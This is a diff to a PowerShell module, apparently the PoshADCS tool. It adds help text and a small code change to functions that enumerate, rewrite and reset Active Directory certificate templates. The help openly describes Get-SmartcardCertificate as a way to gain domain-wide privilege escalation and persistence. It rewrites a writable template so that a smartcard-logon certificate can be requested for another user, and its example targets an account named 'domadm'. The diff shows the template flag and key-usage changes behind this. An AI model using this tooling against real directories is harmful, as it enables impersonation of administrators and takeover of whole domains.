@@ -1,5 +1,17 @@
 ﻿function Get-RootCA
 {
+<#
+.SYNOPSIS
+
+Just a shortcut to PowerViews Get-DomainObject that retrieves Root CAs from the default location at CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration....
+
+Author: Christoph Falta (@cfalta)
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
     $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
     $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
     $RootCA =  Get-DomainObject -SearchBase ("CN=Certification Authorities," + $BasePath) -LDAPFilter "(objectclass=certificationAuthority)"
@@ -8,6 +20,18 @@
 
 function Get-EnterpriseCA
 {
+<#
+.SYNOPSIS
+
+Just a shortcut to PowerViews Get-DomainObject that retrieves Enterprise CAs from the default location at CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration....
+
+Author: Christoph Falta (@cfalta)
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
     $DomainName = "DC=" + (((Get-Domain).Name).Replace(".",",DC="))
     $BasePath = "CN=Public Key Services,CN=Services,CN=Configuration" + "," + $DomainName
     $EnterpriseCA = Get-DomainObject -SearchBase ("CN=Enrollment Services," + $BasePath) -LDAPFilter "(objectclass=pKIEnrollmentService)"
@@ -16,6 +40,33 @@ function Get-EnterpriseCA
 
 function Convert-ADCSPrivateKeyFlag
 {
+
+<#
+.SYNOPSIS
+
+Converts the mspki-private-key-flag specified by the "Flag" parameter.
+
+Author: Christoph Falta (@cfalta)
+
+.PARAMETER Flag
+
+The value to translate.
+
+.EXAMPLE
+
+Convert-ADCSPrivateKeyFlag -Flag 1
+
+Description
+-----------
+
+Translates the value "1" according to microsoft documentation.
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
+
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
@@ -100,6 +151,32 @@ $Result
 }
 function Convert-ADCSNameFlag
 {
+<#
+.SYNOPSIS
+
+Converts the mspki-certificate-name-flag specified by the "Flag" parameter.
+
+Author: Christoph Falta (@cfalta)
+
+.PARAMETER Flag
+
+The value to translate.
+
+.EXAMPLE
+
+Convert-ADCSNameFlag -Flag 1
+
+Description
+-----------
+
+Translates the value "1" according to microsoft documentation.
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
+
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
@@ -181,6 +258,31 @@ $Result
 
 function Convert-ADCSEnrollmentFlag
 {
+<#
+.SYNOPSIS
+
+Converts the mspki-enrollment-flag specified by the "Flag" parameter.
+
+Author: Christoph Falta (@cfalta)
+
+.PARAMETER Flag
+
+The value to translate.
+
+.EXAMPLE
+
+Convert-ADCSEnrollmentFlag -Flag 1
+
+Description
+-----------
+
+Translates the value "1" according to microsoft documentation.
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
@@ -282,6 +384,35 @@ $Result
 
 function Convert-ADCSFlag
 {
+<#
+.SYNOPSIS
+
+Translates the value of a specified flag-attribute into a human readable form.
+
+Author: Christoph Falta (@cfalta)
+
+.PARAMETER Attribute
+
+The flag attribute to translate. Can be one of "mspki-enrollment-flag", "mspki-certificate-name-flag" or "mspki-private-key-flag".
+
+.PARAMETER Value
+
+The value to translate.
+
+.EXAMPLE
+
+Convert-ADCSFlag -Attribute mspki-enrollment-flag -Value 1
+
+Description
+-----------
+
+Converts the value 1 of the attribute mspki-enrollment-flag into a human readable form.
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
 
         [CmdletBinding()]
         Param (
@@ -308,6 +439,48 @@ switch($Attribute)
 
 function Get-ADCSTemplateACL 
 {
+<#
+.SYNOPSIS
+
+Get-ADCSTemplateACL uses PowerViews Get-DomainObjectACL to retrieve the ACLs of a single or all certificate templates. 
+Use the filter switch to remove ACEs that match admin groups or other default groups to reduce the output and gain better visibility.
+
+Author: Christoph Falta (@cfalta)
+
+.PARAMETER Name
+
+The name of the certificate template to search for. If omitted, all templates will be retrieved.
+
+.PARAMETER Filter
+
+Filter the ACEs to reduce output and gain better visibility.
+
+-Filter AdminACEs --> will remove ACEs that match to default admin groups (e.g. Domain Admins)
+-Filter DefaultACEs --> will remove ACEs that match to default domain groups including admin groups (e.g. Domain Admins, Authenticated Users,...)
+
+.EXAMPLE
+
+Get-ADCSTemplateACL -Name Template1 -Filter DefaultACEs
+
+Description
+-----------
+
+Get's the ACEs of the template with name "Template1" and removes all default ACEs
+
+.EXAMPLE
+
+Get-ADCSTemplateACL -Filter AdminACEs
+
+Description
+-----------
+
+Get's the ACEs of all templates and removes admin ACEs
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
 
         [CmdletBinding()]
         Param (
@@ -351,6 +524,49 @@ $TemplatesACL
 
 function Get-ADCSTemplate
 {
+<#
+.SYNOPSIS
+
+This function gets a specified or all objects of type "pKICertificateTemplate" stored under the default path CN=Certificate Templates... from Active Directory using PowerViews Get-DomainObject.
+It can also translate the various flag attributes to human-readable values and include the ACLs of the template objects.
+
+Author: Christoph Falta (@cfalta)
+
+.PARAMETER Name
+
+The name of the certificate template to search for. If omitted, all templates will be retrieved.
+
+.PARAMETER ResolveFlags
+
+Instructs the script to translate the flag attributes to human readable values.
+
+.PARAMETER IncludeACL
+
+Includes the ACLs as of the template in the returned template object.
+
+.EXAMPLE
+
+Get-ADCSTemplate -ResolveFlags
+
+Description
+-----------
+
+Get's all templates and resolves flags.
+
+.EXAMPLE
+
+Get-ADCSTemplate -Name Template1 -ResolveFlags
+
+Description
+-----------
+
+Get's the template with the name "Template1" and resolves flags.
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
 
     [CmdletBinding()]
     Param (
@@ -430,6 +646,44 @@ $Templates
 
 function Set-ADCSTemplate
 {
+<#
+.SYNOPSIS
+
+This function basically is a wrapper around PowerViews Set-Domainobject. The major difference is that it will store the current values of all attributes that should be changed in a global state variable called $global:ADCSTEMPLATESETTINGS.
+Therefore it is very easy to change multiple attributes on a certificate template and automatically reset it after you are done.
+
+Author: Christoph Falta (@cfalta)
+
+.PARAMETER Name
+
+The name of the certificate template to change.
+
+.PARAMETER Properties
+
+A variable of type hashtable containing the attributes you want to change. Have a look at Get-SmartcardCertificate for inspiration.
+
+.PARAMETER Force
+
+Overwrites an existing state variable. Otherwise, the script will not run if a state variable exists to make sure that you don't loose data.
+
+.EXAMPLE
+
+$Properties = @{}
+$Properties.Add('mspki-certificate-name-flag',1)
+$Properties.Add('flags','CLEAR')
+
+Set-ADCSTemplate -Name CorpComputer -Properties $Properties
+
+Description
+-----------
+
+The command above will set the mspki-certificate-name-flag to 1 and clear the flags attribute on the template named CorpComputer
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
     [CmdletBinding()]
     Param (
         [Parameter(Position = 0, Mandatory = $true)]
@@ -493,6 +747,35 @@ else {
 
 function Reset-ADCSTemplate
 {
+<#
+.SYNOPSIS
+
+Reset-ADCSTemplate just calls Set-ADCSTemplate but uses the global environment variable ADCSTEMPLATESETTINGS as input. The variable is cleared after execution.
+
+Author: Christoph Falta (@cfalta)
+
+.DESCRIPTION
+
+This function is used to automatically reset a certificate template to the state before Set-ADCSTemplate was called. The script assumes write permissions.
+
+.PARAMETER TemplateName
+
+The name of the certificate template to use.
+
+.EXAMPLE
+
+Reset-ADCSTemplate -Name CorpComputer
+
+Description
+-----------
+
+Resets the attribute values stored in $global:ADCSTEMPLATESETTINGS on the template CorpComputer.
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
     [CmdletBinding()]
     Param (
         [Parameter(Position = 0, Mandatory = $true)]
@@ -510,7 +793,48 @@ function Reset-ADCSTemplate
             $Global:ADCSTEMPLATESETTINGS = ""
         }
 }
-function Get-SmartCardCertificate{
+function Get-SmartcardCertificate{
+<#
+.SYNOPSIS
+
+Get-SmartCardCertificate allows you to get a Smartcard Certificate from a Windows Enterprise CA for a specified user account by rewriting an arbitrary certificate template that the executing user has write access on. 
+This can be used as method of domain wide privilege escalation (think domain admin) as well as a long-term persistence method. This script heavily relies on PowerView by Will Schroeder.
+
+Author: Christoph Falta (@cfalta)
+
+.DESCRIPTION
+
+Get-SmartCardCertificate will change various attributes in the certificate template defined by the "TemplateName" parameter to make it possible to request a smartcard certificate for the user specified by the parameter "Identity".
+It will then request this certifiate automatically using COM/MS-WCCP protocol and store it in a smartcard that needs to be present on the system executing this script.
+Changes to the certificate template will be rolled back automatically at the end of the script.
+
+.PARAMETER Identity
+
+The user to request a smartcard certificate for.
+
+.PARAMETER TemplateName
+
+The template to rewrite. Note that the script assumes that you have write permissions on the template.
+
+.PARAMETER NoSmartcard
+
+Instructs the script to use the default CSP during enrollment. This will result in the certificate being stored in the default user cert store and not on a smartcard.
+Use this if you have no smartcard or just want a PoC.
+
+.EXAMPLE
+
+Get-SmartcardCertificate -Identity domadm -TemplateName CorpComputer
+
+Description
+-----------
+
+Requests a smartcard certificate for the user domadm using the template CorpComputer.
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
 
     [CmdletBinding()]
     Param (
@@ -540,6 +864,14 @@ if(-not $user)
     Write-Warning "User $($Identity) does not exist."
     $STOPERROR = $true
 }
+else {
+    $TargetUPN = $user.userprincipalname
+    if(-not $TargetUPN)
+    {
+        Write-Warning "User $($Identity) does not have a UPN."
+        $STOPERROR = $true
+    }
+}
 if(-not (Get-ADCSTemplate -Name $TemplateName))
 {
     Write-Warning "Template $($TemplateName) does not exist."
@@ -548,9 +880,6 @@ if(-not (Get-ADCSTemplate -Name $TemplateName))
 
 if(-not $STOPERROR)
 {
-
-    $TargetUPN = $user.userprincipalname
-
     $Properties = @{}
     $Properties.Add('mspki-certificate-name-flag',1)
     $Properties.Add('pkiextendedkeyusage',@('1.3.6.1.4.1.311.20.2.2','1.3.6.1.5.5.7.3.2'))
@@ -594,8 +923,30 @@ if(-not $STOPERROR)
 
 }
 
-function New-VirtualSmartCard
+function New-VirtualSmartcard
 {
+<#
+.SYNOPSIS
+
+Simple PowerShell wrapper around tpmvscmgr.exe.
+
+Author: Christoph Falta (@cfalta)
+
+.EXAMPLE
+
+New-VirtualSmartcard
+
+Description
+-----------
+
+Creates a virtual smartcard with a default pin and a random name prefixed with "VSC"
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
+
     $VSCName = "VSC" + (get-random -Minimum 1000 -Maximum 9999).ToString()   
     $VSCArgs = "create /name " + $VSCName + " /pin default /adminkey random /generate"
 
@@ -623,13 +974,54 @@ function New-VirtualSmartCard
     }
 }
 
-function Get-VirtualSmartCard
+function Get-VirtualsmartCard
 {
+<#
+.SYNOPSIS
+
+Simple wrapper around Get-WmiObject so you dont have to remember the class guid ;-)
+
+Author: Christoph Falta (@cfalta)
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
     Get-wmiobject win32_PnPEntity | ? {$_.ClassGuid -eq "{50DD5230-BA8A-11D1-BF5D-0000F805F530}"} | select-object Name, Description, DeviceID
 }
 
-function Remove-VirtualSmartCard
+function Remove-VirtualsmartCard
 {
+<#
+.SYNOPSIS
+
+Simple wrapper around tpmvscmgr.exe to remove a VSC by ID.
+
+Author: Christoph Falta (@cfalta)
+
+.DESCRIPTION
+
+Simple wrapper around tpmvscmgr.exe to remove a VSC by name.
+
+.PARAMETER DeviceID
+
+The ID of the virtual smartcard device.
+
+.EXAMPLE
+
+Remove-VirtualSmartcard -DeviceID ROOT\SMARTCARDREADER\0000
+
+Description
+-----------
+
+Removes the virtual smartcard with the ID ROOT\SMARTCARDREADER\0000
+
+.LINK
+
+https://github.com/cfalta/PoshADCS
+
+#>
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $false)]
